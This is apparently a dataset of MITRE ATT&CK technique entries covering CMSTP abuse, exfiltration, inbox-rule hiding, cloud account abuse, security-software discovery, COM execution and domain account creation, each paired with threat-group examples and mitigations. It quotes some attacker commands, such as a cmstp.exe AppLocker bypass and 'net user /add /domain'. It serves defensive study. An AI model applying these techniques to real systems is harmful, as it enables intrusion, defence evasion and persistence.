{"text": " Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections. Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017) and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate, signed Microsoft application. CMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)", "idx": "https://attack.mitre.org/techniques/T1218/003", "title": "CMSTP", "entity": "CMSTP", "entity_type": "techniques", "entity_context": ["Cobalt Group has used the command <code>cmstp.exe /s /ns C:\\Users\\ADMINI~W\\AppData\\Local\\Temp\\XKNqbpzl.txt</code> to bypass AppLocker and launch a malicious script.", "Consider using application control configured to block execution of CMSTP.exe if it is not required for a given system or network to prevent potential misuse by adversaries.", "MuddyWater has used CMSTP.exe and a malicious INF to execute its POWERSTATS payload.", "CMSTP.exe may not be necessary within a given environment (unless using it for VPN connection installation)."], "is_subtechnique": true}
{"text": " Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Symmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. Network protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP).", "idx": "https://attack.mitre.org/techniques/T1048/001", "title": "Exfiltration Over Symmetric Encrypted Non-C2 Protocol", "entity": "Exfiltration Over Symmetric Encrypted Non-C2 Protocol", "entity_type": "techniques", "entity_context": ["Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level. ", "Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network. ", "Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network."], "is_subtechnique": true}
{"text": " **This technique has been deprecated. Please use [Remote Services](https://attack.mitre.org/techniques/T1021) where appropriate.** The Graphical User Interfaces (GUI) is a common way to interact with an operating system. Adversaries may use a system's GUI during an operation, commonly through a remote interactive session such as [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076), instead of through a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), to search for information and execute files via mouse double-click events, the Windows Run command (Citation: Wikipedia Run Command), or other potentially difficult to monitor interactions.", "idx": "https://attack.mitre.org/techniques/T1061", "title": "Graphical User Interface", "entity": "Graphical User Interface", "entity_type": "techniques", "entity_context": [], "is_subtechnique": false}
{"text": " Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation: Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule) Adversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) emails sent from the compromised account. Any user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. (Citation: Microsoft Cloud App Security)", "idx": "https://attack.mitre.org/techniques/T1564/008", "title": "Email Hiding Rules", "entity": "Email Hiding Rules", "entity_type": "techniques", "entity_context": ["FIN4 has created rules in victims' Microsoft Outlook accounts to automatically delete emails containing words such as “hacked,\" \"phish,\" and “malware\" in a likely attempt to prevent organizations from communicating about their activities.", "Enterprise email solutions may have monitoring mechanisms that may include the ability to audit inbox rules on a regular basis. \n\nIn an Exchange environment, Administrators can use <code>Get-InboxRule</code> to discover and remove potentially malicious inbox rules."], "is_subtechnique": true}
{"text": " Adversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. In some cases, cloud accounts may be federated with traditional identity management system, such as Window Active Directory. (Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation) Compromised credentials for cloud accounts can be used to harvest sensitive data from online storage accounts and databases. Access to cloud accounts can also be abused to gain Initial Access to a network by abusing a [Trusted Relationship](https://attack.mitre.org/techniques/T1199). Similar to [Domain Accounts](https://attack.mitre.org/techniques/T1078/002), compromise of federated cloud accounts may allow adversaries to more easily move laterally within an environment.", "idx": "https://attack.mitre.org/techniques/T1078/004", "title": "Cloud Accounts", "entity": "Cloud Accounts", "entity_type": "techniques", "entity_context": ["Periodically review user accounts and remove those that are inactive or unnecessary. Limit the ability for user accounts to create additional accounts.", "APT33 has used compromised Office 365 accounts in tandem with Ruler in an attempt to gain control of endpoints.", "Review privileged cloud account permission levels routinely to look for those that could allow an adversary to gain wide access. These reviews should also check if new privileged cloud accounts have been created that were not authorized.", "Use multi-factor authentication for cloud accounts, especially privileged accounts. This can be implemented in a variety of forms (e.g. hardware, virtual, SMS), and can also be audited using administrative reporting features.", "Ensure that cloud accounts, particularly privileged accounts, have complex, unique passwords across all systems on the network. Passwords and access keys should be rotated regularly. This limits the amount of time credentials can be used to access resources if a credential is compromised without your knowledge. Cloud service providers may track access key age to help audit and identify keys that may need to be rotated.", "Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications.", "APT28 has used compromised Office 365 service accounts with Global Administrator privileges to collect email from user inboxes."], "is_subtechnique": true}
{"text": " Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. Example commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software. Adversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.(Citation: Expel IO Evil in AWS)", "idx": "https://attack.mitre.org/techniques/T1518/001", "title": "Security Software Discovery", "entity": "Security Software Discovery", "entity_type": "techniques", "entity_context": ["Mosquito's installer searches the Registry and system to see if specific antivirus tools are installed on the system.", "FinFisher probes the system to check for antimalware processes.", "Comnie attempts to detect several anti-virus products.", "A module in Prikormka collects information from the victim about installed anti-virus software.", "NotPetya determines if specific antivirus programs are running on an infected host machine.", "Darkhotel has searched for anti-malware strings and anti-virus processes running on the system. ", "Grandoreiro can list installed security products including the Trusteer and Diebold Warsaw GAS Tecnologia online banking protections.", "Astaroth checks for the presence of Avast antivirus in the <code>C:\\Program\\Files\\</code> folder. ", "Skidmap has the ability to check if <code>/usr/sbin/setenforce</code> exists. This file controls what mode SELinux is in. ", "VERMIN uses WMI to check for anti-virus software installed on the system.", "EvilBunny has been observed querying installed antivirus software.", "Metamorfo collects a list of installed antivirus software from the victim’s system. ", "T9000 performs checks for various antivirus and security products during installation.", "InvisiMole can check for the presence of network sniffers, AV, and BitDefender firewall.", "Waterbear can find the presence of a specific security software.", "down_new has the ability to detect anti-virus products and processes on a compromised host.", "Frankenstein has used WMI queries to detect if virtualization environments or analysis tools were running on the system.", "PUNCHBUGGY can gather AVs registered in the system.\t", "CHOPSTICK checks for antivirus and forensics software.", "EVILNUM can search for anti-virus products on the system.", "POWERSTATS has detected security tools.", "StrongPity can identify if ESET or BitDefender antivirus are installed before dropping its payload.", "Turla has obtained information on security software, including security logging information that may indicate whether their malware has been detected.", "SUNBURST checked for a variety of antivirus/endpoint detection agents prior to execution.", "JPIN checks for the presence of certain security-related processes and deletes its installer/uninstaller component if it identifies any of them.", "Epic searches for anti-malware services running on the victim’s machine and terminates itself if it finds them.", "ThiefQuest uses the <code>kill_unwanted</code> function to get a list of running processes, compares each process with an encrypted list of “unwanted” security related programs, and kills the processes for security related programs.", "APT38 has identified security software, configurations, defensive tools, and sensors installed on a compromised system.", "ROKRAT checks for debugging tools.", "MuddyWater has used malware to check running processes against a hard-coded list of security tools often used by malware researchers.", "PipeMon can check for the presence of ESET and Kaspersky security software.", "Avenger has the ability to identify installed anti-virus products on a compromised host.", "netsh can be used to discover system firewall settings.", "RTM can obtain information about security software on the victim.", "Windshift has used malware to identify installed AV and commonly used forensic and malware analysis tools.", "xCaon has checked for the existence of Kaspersky antivirus software on the system.", "Empire can enumerate antivirus software on the target.", "Netwalker can detect and terminate active security software-related processes on infected systems.\t", "Rocke used scripts which detected and uninstalled antivirus software.", "The main CozyCar dropper checks whether the victim has an anti-virus product installed. If the installed product is on a predetermined list, the dropper will exit.", "Tropic Trooper can search for anti-virus software running on the system.", "Bazar can identify the installed antivirus engine.", "Wingbird checks for the presence of Bitdefender security software.", "Kasidet has the ability to identify any anti-virus installed on the infected system.", "Operation Wocao has used scripts to detect security software.", "build_downer has the ability to detect if the infected host is running an anti-virus process.", "Naikon uses commands such as <code>netsh advfirewall firewall</code> to discover local firewall settings.", "Carberp has queried the infected system's registry searching for specific registry keys associated with antivirus products.", "StoneDrill can check for antivirus and antimalware programs.\t", "Stuxnet enumerates the currently running processes related to a variety of security products.", "More_eggs can obtain information on installed anti-malware programs.", "Tasklist can be used to enumerate security software currently running on a system by process name of known products.", "Wizard Spider has used WMI to identify anti-virus products installed on a victim's machine.", "Valak can determine if a compromised host has security products installed.", "The White Company has checked for specific antivirus products on the target’s computer, including Kaspersky, Quick Heal, AVG, BitDefender, Avira, Sophos, Avast!, and ESET.", "Crimson contains a command to collect information about anti-virus software on the victim.", "ABK has the ability to identify the installed anti-virus product on the compromised host.", "Gold Dragon checks for anti-malware products and processes.", "LiteDuke has the ability to check for the presence of Kaspersky security software.", "POWRUNER may collect information on the victim's anti-virus software.", "RogueRobin enumerates running processes to search for Wireshark and Windows Sysinternals suite.", "DustySky checks for the existence of anti-virus.", "FELIXROOT checks for installed security software like antivirus and firewall.", "Micropsia searches for anti-virus software and firewall products installed on the victim’s machine using WMI.", "SpicyOmelette can check for the presence of 29 different antivirus tools.", "YAHOYAH checks for antimalware solution processes on the system.", "XCSSET searches firewall configuration files located in <code>/Library/Preferences/</code> and uses <code>csrutil status</code> to determine if System Integrity Protection is enabled.", "FIN8 has used Registry keys to detect and avoid executing in potential sandboxes.", "Zeus Panda checks to see if anti-virus, anti-spyware, or firewall products are installed in the victim’s environment.", "CookieMiner has checked for the presence of \"Little Snitch\", macOS network monitoring and application firewall software, stopping and exiting if it is found.", "Clop can search for processes with antivirus and antimalware product names.", "StreamEx has the ability to scan for security tools such as firewalls and antivirus tools.", "jRAT can list security software, such as by using WMIC to identify anti-virus products installed on the victim’s machine and to obtain firewall details.", "Felismus checks for processes associated with anti-virus vendors.", "QakBot can identify the installed antivirus product on a targeted system.", "FlawedAmmyy will attempt to detect anti-virus products during the initial infection.", "Patchwork scanned the “Program Files” directories for a directory with the string “Total Security” (the installation path of the “360 Total Security” antivirus tool).", "Remsec has a plugin to detect active drivers of some security products.", "BadPatch uses WMI to enumerate installed security products in the victim’s environment.", "TajMahal has the ability to identify which anti-virus products, firewalls, and anti-spyware products are in use.", "MoleNet can use WMI commands to check the system for firewall and antivirus software.", "Cobalt Group used a JavaScript backdoor that is capable of collecting a list of the security solutions installed on the victim's machine.", "MarkiRAT can check for running processes on the victim’s machine to look for Kaspersky and Bitdefender antivirus products.", "Flame identifies security software such as antivirus through the Security module.", "TeamTNT has searched for security products on infected machines.", "BLUELIGHT can collect a list of anti-virus products installed on a machine.", "Sidewinder has used the Windows service <code>winmgmts:\\\\.\\root\\SecurityCenter2</code> to check installed antivirus products."], "is_subtechnique": true}
{"text": " Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. With authenticated access there are several tools that can be used to find accounts. The <code>Get-MsolRoleMember</code> PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365.(Citation: Microsoft msolrolemember)(Citation: GitHub Raindance) The Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command <code>az ad user list</code> will list all users within a domain.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018) The AWS command <code>aws iam list-users</code> may be used to obtain a list of users in the current account while <code>aws iam list-roles</code> can obtain IAM roles that have a specified path prefix.(Citation: AWS List Roles)(Citation: AWS List Users) In GCP, <code>gcloud iam service-accounts list</code> and <code>gcloud projects get-iam-policy</code> may be used to obtain a listing of service accounts and users in a project.(Citation: Google Cloud - IAM Servie Accounts List API)", "idx": "https://attack.mitre.org/techniques/T1087/004", "title": "Cloud Account", "entity": "Cloud Account", "entity_type": "techniques", "entity_context": ["Limit permissions to discover cloud accounts in accordance with least privilege. Organizations should limit the number of users within the organization with an IAM role that has administrative privileges, strive to reduce all permanent privileged role assignments, and conduct periodic entitlement reviews on IAM users, roles and policies.", "Routinely check user permissions to ensure only the expected users have the ability to list IAM identities or otherwise discover cloud accounts."], "is_subtechnique": true}
{"text": " Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) Remote COM execution is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019) Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).(Citation: Microsoft COM) Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)", "idx": "https://attack.mitre.org/techniques/T1559/001", "title": "Component Object Model", "entity": "Component Object Model", "entity_type": "techniques", "entity_context": ["Ursnif droppers have used COM objects to execute the malware's full executable payload.", "Modify Registry settings (directly or using Dcomcnfg.exe) in `HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Classes\\\\AppID\\\\{AppID_GUID}` associated with the process-wide security of individual COM applications.\n\nModify Registry settings (directly or using Dcomcnfg.exe) in `HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Ole` associated with system-wide security defaults for all COM applications that do no set their own process-wide security. ", "Ramsay can use the Windows COM API to schedule tasks and maintain persistence.", "InvisiMole can use the <code>ITaskService</code>, <code>ITaskDefinition</code> and <code>ITaskSettings</code> COM interfaces to schedule a task.", "Ensure all COM alerts and Protected View are enabled.", "TrickBot used COM to setup scheduled task for persistence.", "MuddyWater has used malware that has the capability to execute malicious code via COM, DCOM, and Outlook.", "Gamaredon Group malware can insert malicious macros into documents using a <code>Microsoft.Office.Interop</code> object.\t", "POWERSTATS can use DCOM (targeting the 127.0.0.1 loopback address) to execute additional payloads on compromised hosts."], "is_subtechnique": true}
{"text": " Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Unlike [Upload Malware](https://attack.mitre.org/techniques/T1608/001), this technique focuses on adversaries implanting an image in a registry within a victim’s environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019) A tool has been developed to facilitate planting backdoors in cloud container images.(Citation: Rhino Labs Cloud Backdoor September 2019) If an attacker has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a [Web Shell](https://attack.mitre.org/techniques/T1505/003).(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)", "idx": "https://attack.mitre.org/techniques/T1525", "title": "Implant Internal Image", "entity": "Implant Internal Image", "entity_type": "techniques", "entity_context": ["Limit permissions associated with creating and modifying platform images or containers based on the principle of least privilege.", "Several cloud service providers support content trust models that require container images be signed by trusted sources.", "Periodically check the integrity of images and containers used in cloud deployments to ensure they have not been modified to include malicious software."], "is_subtechnique": false}
{"text": " An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl. Adversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) on the file to increase the likelihood that a user will open it. While [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).", "idx": "https://attack.mitre.org/techniques/T1204/002", "title": "Malicious File", "entity": "Malicious File", "entity_type": "techniques", "entity_context": ["A Word document delivering TYPEFRAME prompts the user to enable macro execution.", "BADFLICK has relied upon users clicking on a malicious attachment delivered through spearphishing.", "Ferocious Kitten has attempted to convince victims to enable malicious content within a spearphishing email by including an odd decoy message.", "Patchwork embedded a malicious macro in a Word document and lured the victim to click on an icon to execute the malware.", "Gamaredon Group has attempted to get users to click on Office attachments with malicious macros embedded.", "Valak has been executed via Microsoft Word documents containing malicious macros.", "Naikon has convinced victims to open malicious attachments to execute malware.", "IndigoZebra sent spearphishing emails containing malicious attachments that urged recipients to review modifications in the file which would trigger the attack.", "Pony has attempted to lure targets into downloading an attached executable (ZIP, RAR, or CAB archives) or document (PDF or other MS Office format).", "Windshift has used e-mail attachments to lure victims into executing malicious code.", "APT30 has relied on users to execute malicious file attachments delivered via spearphishing emails.", "Tonto Team has relied on user interaction to open their spearphishing attachments.", "Kimsuky has used attempted to lure victims into opening malicious e-mail attachments.", "Dark Caracal makes their malware look like Flash Player, Office, or PDF documents in order to entice a user to click on it.", "AppleJeus has required user execution of a malicious MSI installer.", "OilRig has delivered macro-enabled documents that required targets to click the \"enable content\" button to execute the payload on the system.", "NativeZone can display an RTF document to the user  to enable execution of  Cobalt Strike stage shellcode.", "Indrik Spider has attempted to get users to click on a malicious zipped file. ", "menuPass has attempted to get victims to open malicious files such as Windows Shortcuts (.lnk) and/or Microsoft Office documents, sent via email as part of spearphishing campaigns.", "Transparent Tribe has used weaponized documents in e-mail to compromise targeted systems.", "PROMETHIUM has attempted to get users to execute compromised installation files for legitimate software including compression applications, security software, browsers, file recovery applications, and other tools and utilities.", "Agent Tesla has been executed through malicious e-mail attachments ", "Nomadic Octopus as attempted to lure victims into clicking on malicious attachments within spearphishing emails.", "APT19 attempted to get users to launch malicious attachments delivered via spearphishing emails.", "EnvyScout has been executed through malicious files attached to e-mails.", "FIN7 lured victims to double-click on images in the attachments they sent which would then execute the hidden LNK file.", "QakBot has gained execution through users opening malicious attachments.", "The White Company has used phishing lure documents that trick users into opening them and infecting their computers.", "APT-C-36 has prompted victims to accept macros in order to execute the subsequent payload.", "MuddyWater has attempted to get users to enable macros and launch malicious Microsoft Word documents delivered via spearphishing emails.\t ", "Darkhotel has sent spearphishing emails in an attempt to lure users into clicking on a malicious attachments.", "APT39 has sent spearphishing emails in an attempt to lure users to click on a malicious attachment.", "FIN8 has used malicious e-mail attachments to lure victims into executing malware.", "Rifdoor has been executed from malicious Excel or Word documents containing macros.", "JSS Loader has been executed through malicious attachments contained in spearphishing emails.", "Mustang Panda has sent malicious files requiring direct victim interaction to execute.", "TA551 has prompted users to enable macros within spearphishing attachments to install malware.", "StrongPity has been executed via compromised installation files for legitimate software including compression applications, security software, browsers, file recovery applications, and other tools and utilities.", "TA505 has used lures to get users to enable content in malicious attachments and execute malicious files contained in archives. For example, TA505 makes their malware look like legitimate Microsoft Word documents, .pdf and/or .lnk files. ", "Astaroth has used malicious files including VBS, LNK, and HTML for execution.", "On Windows 10, various Attack Surface Reduction (ASR) rules can be enabled to prevent the execution of potentially malicious executable files (such as those that have been downloaded and executed by Office applications/scripting interpreters/email clients or that do not meet specific prevalence, age, or trusted list criteria). Note: cloud-delivered protection must be enabled for certain rules. ", "Tropic Trooper has lured victims into executing malware via malicious e-mail attachments.", "Grandoreiro has infected victims via malicious attachments.", "Cardinal RAT lures victims into executing malicious macros embedded within Microsoft Excel documents.", "APT12 has attempted to get victims to open malicious Microsoft Word and PDF attachment sent via spearphishing.", "Sandworm Team has tricked unwitting recipients into clicking on spearphishing attachments and enabling malicious macros embedded within files.", "Rancor attempted to get users to click on an embedded macro within a Microsoft Office Excel document to launch their malware.", "Taidoor has relied upon a victim to click on a malicious email attachment.", "Molerats has sent malicious files via email that tricked users into clicking Enable Content to run an embedded macro and to download malicious archives.", "Metamorfo requires the user to double-click the executable to run the malicious HTA file or to download a malicious installer. ", "CSPY Downloader has been delivered via malicious documents with embedded macros.", "PLATINUM has attempted to get users to open malicious files by sending spearphishing emails with attachments to victims.", "Hancitor has used malicious Microsoft Word documents, sent via email, which prompted the victim to enable macros.", "FIN4 has lured victims to launch malicious attachments delivered via spearphishing emails (often sent from compromised accounts).", "FIN6 has used malicious documents to lure victims into allowing execution of PowerShell scripts.", "APT37 has sent spearphishing attachments attempting to get a user to open them.", "Gorgon Group attempted to get users to launch malicious Microsoft Office attachments delivered via spearphishing emails.", "PLEAD has been executed via malicious e-mail attachments.", "BoomBox has gained execution through user interaction with a malicious file.", "Bundlore has attempted to get users to execute a malicious .app file that looks like a Flash Player update.", "InvisiMole can deliver trojanized versions of software and documents, relying on user execution.", "Machete has relied on users opening malicious attachments delivered through spearphishing to execute malware.", "SQLRat relies on users clicking on an embedded image to execute the scripts.", "RTM has attempted to lure victims into opening e-mail attachments to execute malicious code.", "Lazarus Group has attempted to get users to launch a malicious Microsoft Word attachment delivered via a spearphishing email.", "Andariel has attempted to lure victims into enabling malicious macros within email attachments.", "Higaisa used malicious e-mail attachments to lure victims into executing LNK files.", "Inception lured victims into clicking malicious files for machine reconnaissance and to execute malware.", "APT38  has attempted to lure victims into enabling malicious macros within email attachments.", "Whitefly has used malicious .exe or .dll files disguised as documents or images.", "Dridex has relied upon users clicking on a malicious attachment delivered through spearphishing.", "Sharpshooter has sent malicious DOC and PDF files to targets so that they can be opened by a user.", "Wizard Spider has lured victims to execute malware with spearphishing attachments containing macros to download either Emotet, Bokbot, TrickBot, or Bazar.", "IcedID has been executed through Word documents with malicious embedded macros.", "BRONZE BUTLER has attempted to get users to launch malicious Microsoft Word attachments delivered via spearphishing emails.", "Chaes requires the user to click on the malicious Word document to execute the next part of the attack. ", "Ramsay has been executed through malicious e-mail attachments.", "Kerrdown has gained execution through victims opening malicious files.", "Emotet has relied upon users clicking on a malicious attachment delivered through spearphishing.", "Application control may be able to prevent the running of executables masquerading as other files.", "Mofang's malicious spearphishing attachments required a user to open the file after receiving.", "NETWIRE has been executed through luring victims into opening malicious documents.", "APT28 attempted to get users to click on Microsoft Office attachments containing malicious macro scripts.", "BlackTech has used e-mails with malicious documents to lure victims into installing malware.\t ", "REvil has been executed via malicious MS Word e-mail attachments.", "Frankenstein has used trojanized Microsoft Word documents sent via email, which prompted the victim to enable macros.", "Bandook has used lure documents to convince the user to enable macros. ", "KGH_SPY has been spread through Word documents containing malicious macros.", "OSX/Shlayer relies on users mounting and executing a malicious DMG file.", "Elderwood has leveraged multiple types of spearphishing in order to attempt to get a user to open attachments.", "Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events.", "TA459 has attempted to get victims to open malicious Microsoft Word attachment sent via spearphishing.", "Ajax Security Team has lured victims into executing malicious files.", "Gallmaker sent victims a lure document with a warning that asked victims to “enable content” for execution.", "Lokibot has tricked recipients into enabling malicious macros by getting victims to click \"enable content\" in email attachments.", "CARROTBALL has been executed through users being lured into opening malicious e-mail attachments.", "DarkHydrus has sent malware that required users to hit the enable button in Microsoft Excel to allow an .iqy file to be downloaded.", "Silence attempts to get users to launch malicious attachments delivered via spearphishing emails.", "Sidewinder has lured targets to click on malicious files to gain execution in the target environment.", "TrickBot has attempted to get users to launch malicious documents to deliver its payload. ", "RTM has relied on users opening malicious email attachments, decompressing the attached archive, and double-clicking the executable within.", "Cobalt Group has sent emails containing malicious attachments that require users to execute a file or macro to infect the victim machine.", "Javali has achieved execution through victims opening malicious attachments, including MSI files with embedded VBScript.", "BLINDINGCAN has lured victims into executing malicious macros embedded within Microsoft Office documents.", "Magic Hound has attempted to lure victims into opening malicious email attachments.", "APT32 has attempted to lure users to execute a malicious dropper delivered via a spearphishing attachment.", "admin@338 has attempted to get victims to launch malicious Microsoft Word attachments delivered via spearphishing emails.", "SYSCON has been executed by luring victims to open malicious e-mail attachments.", "APT29 has used various forms of spearphishing attempting to get a user to open attachments, including, but not limited to, malicious Microsoft Word documents, .pdf, and .lnk files.  ", "APT33 has used malicious e-mail attachments to lure victims into executing malware.", "AppleSeed can achieve execution through users running malicious file attachments distributed via email.", "PoetRAT has used spearphishing attachments to infect victims.", "The GuLoader executable has been retrieved via embedded macros in malicious Word documents.", "Leviathan has sent spearphishing attachments attempting to get a user to click.", "JCry has achieved execution by luring users to click on a file that appeared to be an Adobe Flash Player update installer. ", "Dragonfly 2.0 has used various forms of spearphishing in attempts to get users to open attachments.", "Octopus has relied upon users clicking on a malicious attachment delivered through spearphishing.", "Bad Rabbit has been executed through user installation of an executable disguised as a flash installer."], "is_subtechnique": true}
{"text": " Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.(Citation: NSA NCSC Turla OilRig) Compromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.", "idx": "https://attack.mitre.org/techniques/T1584/003", "title": "Virtual Private Server", "entity": "Virtual Private Server", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls.", "Turla has used the VPS infrastructure of compromised Iranian threat actors."], "is_subtechnique": true}
{"text": " Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account. Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.", "idx": "https://attack.mitre.org/techniques/T1136/002", "title": "Domain Account", "entity": "Domain Account", "entity_type": "techniques", "entity_context": ["HAFNIUM has created and granted privileges to domain accounts.", "Empire has a module for creating a new domain user if permissions allow.", "Pupy can user PowerView to execute “net user” commands and create domain accounts.", "The <code>net user username \\password \\domain</code> commands in Net can be used to create a domain account.", "PsExec has the ability to remotely create accounts on target systems.", "Configure access controls and firewalls to limit access to domain controllers and systems used to create and manage accounts.", "GALLIUM created high-privileged domain user accounts to maintain access to victim networks.", "Protect domain controllers by ensuring proper security configuration for critical servers.", "Use multi-factor authentication for user and privileged accounts.", "Sandworm Team has created new domain accounts on an ICS access server.", "Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."], "is_subtechnique": true}
